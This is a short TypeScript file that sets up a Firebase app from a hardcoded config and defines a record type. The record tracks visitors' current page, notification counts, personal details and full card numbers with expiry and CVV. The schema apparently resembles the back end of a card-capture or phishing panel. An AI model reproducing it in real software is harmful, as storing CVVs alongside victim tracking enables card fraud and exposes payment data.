import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore} from 'firebase/firestore';
import { getDatabase} from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyB1Tpv9S00TO__RCkAN95ydnMQDR7yEb0A",
  authDomain: "csa3-e2b6a.firebaseapp.com",
  databaseURL: "https://csa3-e2b6a-default-rtdb.firebaseio.com",
  projectId: "csa3-e2b6a",
  storageBucket: "csa3-e2b6a.firebasestorage.app",
  messagingSenderId: "328650323342",
  appId: "1:328650323342:web:468ea6435238c0452be0df",
  measurementId: "G-D32GDGT38Q"
};


const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);


export { app, auth, db ,database};

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}

